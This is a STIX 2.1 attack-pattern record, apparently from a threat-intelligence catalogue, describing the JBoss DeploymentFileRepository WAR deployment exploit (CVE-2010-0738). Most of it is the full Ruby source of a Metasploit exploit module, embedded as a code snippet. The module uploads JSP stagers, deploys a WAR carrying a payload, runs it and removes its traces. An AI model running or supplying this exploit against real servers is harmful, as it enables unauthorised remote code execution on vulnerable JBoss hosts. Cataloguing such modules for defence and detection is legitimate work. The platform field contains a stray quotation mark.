{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0460a0f6-93d4-4d6a-9146-53088eb9ea17",
    "created": "2024-08-14T17:11:52.131961Z",
    "modified": "2024-08-14T17:11:52.131965Z",
    "name": "JBoss Java Class DeploymentFileRepository WAR Deployment",
    "description": " This module uses the DeploymentFileRepository class in JBoss Application Server (jbossas) to deploy a JSP file which then deploys the WAR file. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jboss_deploymentfilerepository.rb",
            "external_id": "jboss_deploymentfilerepository.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.redteam-pentesting.de/publications/jboss"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=574105"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /(Jetty|JBoss)/ ] }\n\n  include Msf::Exploit::Remote::HTTP::JBoss\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'JBoss Java Class DeploymentFileRepository WAR Deployment',\n      'Description' => %q{\n          This module uses the DeploymentFileRepository class in\n        JBoss Application Server (jbossas) to deploy a JSP file\n        which then deploys the WAR file.\n      },\n      'Author'      => [ 'MC', 'Jacob Giannantonio', 'Patrick Hof', 'h0ng10' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2010-0738' ], # by using VERB other than GET/POST\n          [ 'OSVDB', '64171' ],\n          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],\n        ],\n      'Privileged'  => false,\n      'Platform'    => %w{ java linux win },\n      'Targets'     =>\n        [\n          #\n          # do target detection but java meter by default\n          # detect via /manager/serverinfo\n          #\n          [ 'Automatic (Java based)',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java',\n            } ],\n\n          #\n          # Platform specific targets only\n          #\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            },\n          ],\n          [ 'Linux Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ],\n\n          #\n          # Java version\n          #\n          [ 'Java Universal',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n            }\n          ]\n        ],\n\n      'DisclosureDate' => '2010-04-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('JSP',   [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),\n        OptString.new('APPBASE', [ false, 'Application base name, (default: random)', nil ])\n      ])\n  end\n\n  def exploit\n    jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))\n    app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))\n    stager_base = rand_text_alpha(8+rand(8))\n    stager_jsp_name  = rand_text_alpha(8+rand(8))\n\n    p = payload\n    mytarget = target\n\n    if (http_verb == 'HEAD')\n      print_status(\"Unable to automatically select a target with HEAD requests\")\n    else\n      if (target.name =~ /Automatic/)\n        mytarget = auto_target(targets)\n        if (not mytarget)\n          fail_with(Failure::NoTarget, \"Unable to automatically select a target\")\n        end\n        print_status(\"Automatically selected target \\\"#{mytarget.name}\\\"\")\n      else\n        print_status(\"Using manually select target \\\"#{mytarget.name}\\\"\")\n      end\n      arch = mytarget.arch\n    end\n\n\n    # set arch/platform from the target\n    plat = [Msf::Module::PlatformList.new(mytarget['Platform']).platforms[0]]\n\n    # We must regenerate the payload in case our auto-magic changed something.\n    return if ((p = exploit_regenerate_payload(plat, arch)) == nil)\n\n    # Generate the WAR containing the payload\n    war_data = p.encoded_war({\n      :app_name => app_base,\n      :jsp_name => jsp_name,\n      :arch => mytarget.arch,\n      :platform => mytarget.platform\n    }).to_s\n\n    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\\n/, '')\n    stager_contents = stager_jsp_with_payload(app_base, encoded_payload)\n    # Depending on the type on the verb we might use a second stager\n    if http_verb == \"POST\" then\n      print_status(\"Deploying stager for the WAR file\")\n      res = upload_file(stager_base, stager_jsp_name, stager_contents)\n    else\n      print_status(\"Deploying minimal stager to upload the payload\")\n      head_stager_jsp_name = rand_text_alpha(8+rand(8))\n      head_stager_contents = head_stager_jsp(stager_base, stager_jsp_name)\n      head_stager_uri = \"/\" + stager_base + \"/\" + head_stager_jsp_name + \".jsp\"\n      res = upload_file(stager_base, head_stager_jsp_name, head_stager_contents)\n\n      # We split the stager_jsp_code in multipe junks and transfer on the\n      # target with multiple requests\n      current_pos = 0\n      while current_pos < stager_contents.length\n        next_pos = current_pos + 5000 + rand(100)\n        vars_get = { \"arg0\" => stager_contents[current_pos,next_pos] }\n        print_status(\"Uploading second stager (#{current_pos}/#{stager_contents.length})\")\n        res = deploy('uri' => head_stager_uri,\n                     'vars_get' => vars_get)\n        current_pos += next_pos\n      end\n    end\n\n    # Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),\n    # but the file still gets written.\n    unless res && ( res.code == 200 || res.code == 500)\n      fail_with(Failure::Unknown, \"Failed to deploy\")\n    end\n\n    print_status(\"Calling stager to deploy the payload warfile (might take some time)\")\n    stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'\n    stager_res = deploy('uri' => stager_uri,\n                        'method' => 'GET')\n\n    print_status(\"Try to call the deployed payload\")\n    # Try to execute the payload by calling the deployed WAR file\n    payload_uri = \"/\" + app_base + \"/\" + jsp_name + '.jsp'\n    payload_res = deploy('uri' => payload_uri)\n\n    #\n    # DELETE\n    #\n    # The WAR can only be removed by physically deleting it, otherwise it\n    # will get redeployed after a server restart.\n    print_status(\"Undeploying stager and payload WARs via DeploymentFileRepository.remove()...\")\n    print_status(\"This might take some time, be patient...\") if http_verb == \"HEAD\"\n    delete_res = []\n    if head_stager_jsp_name\n      delete_res << delete_file(stager_base + '.war', head_stager_jsp_name, '.jsp')\n    end\n    delete_res << delete_file(stager_base + '.war', stager_jsp_name, '.jsp')\n    delete_res << delete_file('./', stager_base + '.war', '')\n    delete_res << delete_file('./', app_base + '.war', '')\n    delete_res.each do |res|\n      if !res\n        print_warning(\"WARNING: Unable to remove WAR [No Response]\")\n      elsif (res.code < 200 || res.code >= 300)\n        print_warning(\"WARNING: Unable to remove WAR [#{res.code} #{res.message}]\")\n      end\n\n      handler\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-26",
    "x_mitre_platforms": [
        "java'"
    ]
}